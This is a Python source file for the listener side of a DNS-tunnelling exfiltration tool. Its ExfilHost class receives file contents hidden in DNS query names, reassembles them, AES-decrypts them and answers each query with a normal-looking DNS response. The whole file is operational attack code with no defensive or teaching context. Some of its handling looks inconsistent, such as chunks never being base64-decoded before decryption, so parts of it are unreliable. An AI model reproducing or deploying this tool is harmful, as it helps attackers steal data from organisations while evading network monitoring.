import socket
import dns.message
import dns.query
import os.path
import base64
from crypto import AES256

class ExfilHost:
    def __init__(self, args):
        self.host_ip = args.hostip
        self.port = args.port
        self.password = args.password
        self.BUFFER = 1024
        self.server = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
        self.server.bind((self.host_ip, self.port))

        self.file_handle = None
        self.file_name = None
        self.file_buffer = bytearray()

        print(f"UDP server bound to {self.host_ip}:{self.port}")

    def run(self):
        while True:
            try:
                msg = dns.query.receive_udp(self.server, ignore_trailing=True)

                query = msg[0]
                from_tuple = msg[2]

                self.parse(msg)

                response = dns.message.make_response(query)
                dns.query.send_udp(self.server, response, from_tuple)

            except Exception as ex:
                print(ex)

    def parse(self, msg):
        data = str(msg[0].question[0].name)
        data = data[:-1]
        print(f"Received data: {data}")

        if "BEGIN=" in data:
            filename_base64 = data.split('=')[1]
            self.file_name = base64.b64decode(filename_base64).decode('utf-8')

            if os.path.exists(self.file_name):
                print(f"Found existing file: {self.file_name}. Deleting")
                os.remove(self.file_name)

            self.file_handle = open(self.file_name, "ab")
            print(f"Created new file: {self.file_name}")

        elif data == "---END---":
            self.file_handle.close()
            print(f"Closed file: {self.file_name}")

            contents = None
            with open(self.file_name, "rb") as f:
                contents = f.read()
                if len(contents) == 0:
                    raise IOError("File empty. Cannot decrypt. Aborting")

            aes = AES256(self.password)
            decrypted_contents = aes.decrypt_bytes(contents)
            os.remove(self.file_name)
            with open(self.file_name, "wb") as f:
                f.write(decrypted_contents)

            print(f"Decrypted file: {self.file_name}")

            self.file_name = None
            self.file_handle = None
            self.file_buffer.clear()
            self.file_buffer = None

        else:
            if self.file_handle.closed:
                raise IOError("File handle is closed. Aborting")

            data_encoded = data.encode("utf-8")

            self.file_handle.write(data_encoded)
            self.file_handle.flush()
